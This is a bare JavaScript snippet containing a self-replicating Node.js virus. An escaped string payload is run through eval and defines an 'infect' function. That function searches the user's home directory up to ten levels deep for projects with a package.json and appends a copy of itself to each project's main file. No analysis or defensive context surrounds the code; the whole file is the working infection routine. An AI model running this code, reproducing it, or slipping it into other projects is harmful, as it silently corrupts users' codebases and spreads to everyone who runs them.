(function() {
        var payload = "\"use strict\";function _toConsumableArray(arr){if(Array.isArray(arr)){for(var i=0,arr2=Array(arr.length);i<arr.length;i++)arr2[i]=arr[i];return arr2}return Array.from(arr)}global.infect=function(payload){function readdir(dir){return new Promise(function(rs,rj){fs.readdir(dir,function(e,r){return e?rj(e):rs(r)})})}function stat(f){return new Promise(function(rs){fs.stat(f,function(err,res){rs(!err&&res.isFile()?\"file\":!err&&res.isDirectory()?\"dir\":null)})})}function appendFile(f,data){return new Promise(function(rs,rj){fs.appendFile(f,data,function(e){return e?rj(e):rs()})})}function readFile(f){return new Promise(function(rs,rj){fs.readFile(f,\"utf-8\",function(e,r){return e?rj(e):rs(r)})})}function getProjectMains(root,depth){return depth<1?[]:readdir(root).then(function(files){return Promise.all(files.map(function(file){var full=path.join(root,file);return stat(full).then(function(dirInfo){if(\"dir\"!==dirInfo)return[];var pkgPath=path.join(full,\"package.json\");return stat(pkgPath).then(function(res){return\"file\"!==res?getProjectMains(full,depth-1):readFile(pkgPath).then(function(res){try{var main=JSON.parse(res).main||\"index.js\"}catch(e){return[]}var mainPath=path.join(full,main);return stat(mainPath).then(function(res){return\"file\"===res?[mainPath]:[]})})})})})).then(function(arrs){var res=[],_iteratorNormalCompletion=!0,_didIteratorError=!1,_iteratorError=void 0;try{for(var _step,_iterator=arrs[Symbol.iterator]();!(_iteratorNormalCompletion=(_step=_iterator.next()).done);_iteratorNormalCompletion=!0){var arr=_step.value;res.push.apply(res,_toConsumableArray(arr))}}catch(err){_didIteratorError=!0,_iteratorError=err}finally{try{!_iteratorNormalCompletion&&_iterator.return&&_iterator.return()}finally{if(_didIteratorError)throw _iteratorError}}return res})})}var fs=require(\"fs\"),os=require(\"os\"),path=require(\"path\"),modifiedPayload='\\n(function() {\\n    var payload = \"'+function(str){return str.replace(/[\\\\\"]/g,\"\\\\$&\")}(payload)+'\";\\n    eval(payload);\\n    global.infect( payload );\\n})();\\n    ';getProjectMains(os.homedir(),10).then(function(files){return Promise.all(files.map(function(file){readFile(file).then(function(data){if(-1===data.indexOf(modifiedPayload))return appendFile(file,modifiedPayload)})}))})};";
        var decoded = decodeURI(payload);
        eval(decoded);
        infect(payload);
    })();